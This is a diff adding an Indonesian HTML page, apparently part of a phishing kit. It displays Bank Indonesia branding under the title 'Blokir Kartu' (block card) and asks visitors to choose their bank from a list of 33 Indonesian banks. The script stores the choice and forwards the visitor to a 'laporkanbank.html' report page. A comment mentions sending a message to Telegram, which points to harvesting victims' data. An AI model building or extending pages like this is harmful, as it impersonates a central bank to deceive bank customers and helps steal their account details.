@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Blokir Kartu - Pilih Bank</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <style>
+      body {
+        background-color: #f3f6fb;
+        font-family: 'Segoe UI', sans-serif;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+      .main-content {
+        flex: 1;
+        padding: 20px;
+      }
+      .form-box {
+        background-color: white;
+        padding: 20px;
+        border-radius: 12px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.08);
+      }
+      .btn-primary {
+        border-radius: 8px;
+      }
+      .header-img img {
+        width: 100%;
+        height: auto;
+        display: block;
+      }
+       .bi-img-full {
+      width: 100%;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    </style>
+  </head>
+  <body>
+    <div class="header-img">
+      <img src="binavbar.PNG" alt="Bank Indonesia Header" />
+    </div>
+    <img src="biimg.PNG" alt="B  I Image" class="bi-img-full" />
+    <div class="container main-content">
+      <div class="form-box">
+        <form id="bankSelectForm">
+          <h5 class="text-center mb-4">PILIH PENYEDIA BANK ANDA UNTUK BUAT LAPORAN</h5>
+          <div class="mb-3">
+<select class="form-control" name="bank" id="bankSelect" required>
+  <option value="" disabled selected>Pilih Bank</option>
+  <option value="BCA">Bank Central Asia (BCA)</option>
+  <option value="Mandiri">Bank Mandiri</option>
+  <option value="BNI">Bank Negara Indonesia (BNI)</option>
+  <option value="BRI">Bank Rakyat Indonesia (BRI)</option>
+  <option value="BTN">Bank Tabungan Negara (BTN)</option>
+  <option value="Danamon">Bank Danamon</option>
+  <option value="Permata">Bank Permata</option>
+  <option value="CIMB Niaga">CIMB Niaga</option>
+  <option value="Panin Bank">Panin Bank</option>
+  <option value="Maybank">Maybank Indonesia</option>
+  <option value="BTPN">Bank BTPN</option>
+  <option value="OCBC NISP">OCBC NISP</option>
+  <option value="Bank Mega">Bank Mega</option>
+  <option value="Bank Sinarmas">Bank Sinarmas</option>
+  <option value="Bank Bukopin">Bank Bukopin</option>
+  <option value="Bank Jago">Bank Jago</option>
+  <option value="Bank Neo Commerce">Bank Neo Commerce</option>
+  <option value="Bank Syariah Indonesia (BSI)">Bank Syariah Indonesia (BSI)</option>
+  <option value="Bank DKI">Bank DKI</option>
+  <option value="Bank Sumut">Bank Sumut</option>
+  <option value="Bank Jatim">Bank Jatim</option>
+  <option value="Bank Jateng">Bank Jateng</option>
+  <option value="Bank Kaltimtara">Bank Kaltimtara</option>
+  <option value="Bank Kalsel">Bank Kalsel</option>
+  <option value="Bank Kalbar">Bank Kalbar</option>
+  <option value="Bank Nagari">Bank Nagari</option>
+  <option value="Bank Papua">Bank Papua</option>
+  <option value="Bank Maluku">Bank Maluku Malut</option>
+  <option value="Bank Lampung">Bank Lampung</option>
+  <option value="SeaBank">SeaBank</option>
+  <option value="Blu by BCA">Blu by BCA</option>
+  <option value="Line Bank">Line Bank</option>
+  <option value="TMRW by UOB">TMRW by UOB</option>
+</select>
+
+          </div>
+<button type="submit" class="btn btn-primary btn-block w-100">Lanjutkan</button>
+        </form>
+      </div>
+    </div>
+
+   <script>
+document.getElementById("bankSelectForm").addEventListener("submit", function (e) {
+  e.preventDefault();
+  const selectedBank = document.getElementById("bankSelect").value;
+
+  if (!selectedBank) {
+    alert("Silakan pilih bank terlebih dahulu");
+    return;
+  }
+
+  localStorage.setItem("selectedBank", selectedBank); // Simpan bank ke localStorage
+
+  // Kirim pesan ke Telegram (opsional di sini atau nanti di laporkanbank.html)
+  // window.location.href = "laporkanbank.html";
+  setTimeout(() => {
+    window.location.href = "laporkanbank.html";
+  }, 300);
+});
+</script>
+
+  </body>
+</html>
